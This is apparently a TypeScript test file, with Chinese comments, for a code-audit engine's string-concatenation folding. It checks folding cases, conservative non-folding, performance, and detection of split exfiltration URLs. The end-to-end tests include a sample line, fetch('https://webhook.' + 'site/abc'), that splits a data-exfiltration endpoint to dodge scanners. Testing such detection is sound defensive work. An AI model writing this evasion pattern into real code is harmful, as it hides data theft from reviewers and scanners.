// Wave-H:字符串字面量拼接折叠(foldStringConcatLiterals)测试。
//
// 覆盖四类:
//   1. 折叠单元 —— 基本/多段/混合引号/转义/多链条/上限/无可折叠
//   2. 保守性(重中之重)—— 链中出现标识符/模板/数字/函数调用一律不折叠,零误折
//   3. 端到端 —— 单行拼接端点经折叠命中 exfil-endpoint;良性拼接零 finding
//   4. 性能 —— 病态输入线性,墙钟宽松预算

import { describe, expect, it } from 'vitest';
import { allFileRules, allRules } from '../rules/index.ts';
import { auditContents, foldStringConcatLiterals } from '../src/core/audit/engine.ts';

function ruleIds(content: string): string[] {
  return auditContents(allRules, [{ file: 'x.js', content }], allFileRules).findings.map((f) => f.ruleId);
}

describe('foldStringConcatLiterals — 折叠单元', () => {
  it('基本双段折叠', () => {
    expect(foldStringConcatLiterals("'a' + 'b'")).toBe("'ab'");
  });

  it('三段折叠 + 保留行内非拼接部分', () => {
    expect(foldStringConcatLiterals("const x = 'a' + 'b' + 'c';")).toBe("const x = 'abc';");
  });

  it('赋值目标是标识符不影响右侧纯字面量链折叠', () => {
    // host = 在拼接链之外,右侧 'a' + 'b' 是纯字面量 → 折叠。
    expect(foldStringConcatLiterals("host = 'a' + 'b'")).toBe("host = 'ab'");
  });

  it('混合引号:折叠结果用首段的引号风格', () => {
    expect(foldStringConcatLiterals(`'a' + "b"`)).toBe("'ab'");
  });

  it('转义引号:值正确解码后按首段引号重新编码', () => {
    // 首段字面量值为 a'b(\\' 解码为 '),拼 c → a'bc,用 ' 包裹时内部 ' 需转义。
    expect(foldStringConcatLiterals("'a\\'b' + 'c'")).toBe("'a\\'bc'");
  });

  it('一行多条独立链各自折叠', () => {
    expect(foldStringConcatLiterals("f('a' + 'b') + g('c' + 'd')")).toBe("f('ab') + g('cd')");
  });

  it('16 段全折叠成功', () => {
    const chain = Array.from({ length: 16 }, () => "'x'").join(' + ');
    expect(foldStringConcatLiterals(chain)).toBe(`'${'x'.repeat(16)}'`);
  });

  it('超过 16 段:单链封顶 16,第 17 段落到链外', () => {
    // 17 段:前 16 段折成一个 16-x 字面量,第 17 段后无 `+`,单段不折 → 原样留下。
    // (上限保证单链不无限膨胀;链外的后续段按新链处理,每条链仍 ≤16 段。)
    const chain = Array.from({ length: 17 }, () => "'x'").join(' + ');
    const out = foldStringConcatLiterals(chain);
    expect(out).not.toBeNull();
    expect(out).toContain(`'${'x'.repeat(16)}'`); // 前 16 段折叠
    expect(out).toContain("+ 'x'"); // 第 17 段单独留
    expect(out).not.toContain(`'${'x'.repeat(17)}'`); // 上限生效,没折成 17
  });

  it('无可折叠 → null', () => {
    expect(foldStringConcatLiterals('const x = 5;')).toBeNull();
    expect(foldStringConcatLiterals("'single'")).toBeNull();
    expect(foldStringConcatLiterals('plain text no quotes')).toBeNull();
  });
});

describe('foldStringConcatLiterals — 保守性(零误折)', () => {
  const noFold: Array<[string, string]> = [
    ['拼接项是标识符', "'a' + host"],
    ['标识符在链中间', "'a' + host + 'b'"],
    ['模板串', "'a' + `b`"],
    ['数字', "'a' + 1"],
    ['函数调用结果参与', "f('a') + 'b'"],
    ['字面量内部含加号(单字面量)', "'a+b'"],
    ['成员访问参与', "'a' + obj.b"],
  ];
  for (const [label, input] of noFold) {
    it(`不折叠:${label}`, () => {
      expect(foldStringConcatLiterals(input)).toBeNull();
    });
  }
});

describe('拼接折叠 — 端到端', () => {
  it('单行拼接把 endpoint 拆开,折叠后命中 exfil-endpoint', () => {
    const ids = ruleIds("fetch('https://webhook.' + 'site/abc');");
    expect(ids).toContain('exfiltration/exfil-endpoint');
  });

  it('excerpt 保留攻击者原样拼接写法(不显示折叠结果)', () => {
    const report = auditContents(
      allRules,
      [{ file: 'x.js', content: "fetch('https://webhook.' + 'site/abc');" }],
      allFileRules,
    );
    const hit = report.findings.find((f) => f.ruleId === 'exfiltration/exfil-endpoint');
    expect(hit?.excerpt).toContain("'https://webhook.' + 'site/abc'");
  });

  it('良性 API 拼接零 finding', () => {
    expect(ruleIds("fetch('https://api.example.' + 'com/data');")).toEqual([]);
    expect(ruleIds("const base = 'https://api.example.' + 'com/v1';")).toEqual([]);
    expect(ruleIds("const msg = 'hello ' + 'world';")).toEqual([]);
  });
});

describe('拼接折叠 — 性能(线性)', () => {
  it('2KB 病态行折叠 100 次在预算内', () => {
    // 大量引号与 + 的病态行(独立单字面量,交替 + 与非拼接),压折叠扫描器。
    const pathological = Array.from({ length: 200 }, (_, i) => `'seg${i}'`).join(' , ') + ' + '.repeat(50);
    const line = pathological.slice(0, 2048);
    const start = performance.now();
    for (let i = 0; i < 100; i++) foldStringConcatLiterals(line);
    const elapsed = performance.now() - start;
    // 线性扫描应远快于此;宽松预算吸收 CI 抖动(对齐 w3-re2 测试写法)。
    expect(elapsed).toBeLessThan(500);
  });
});
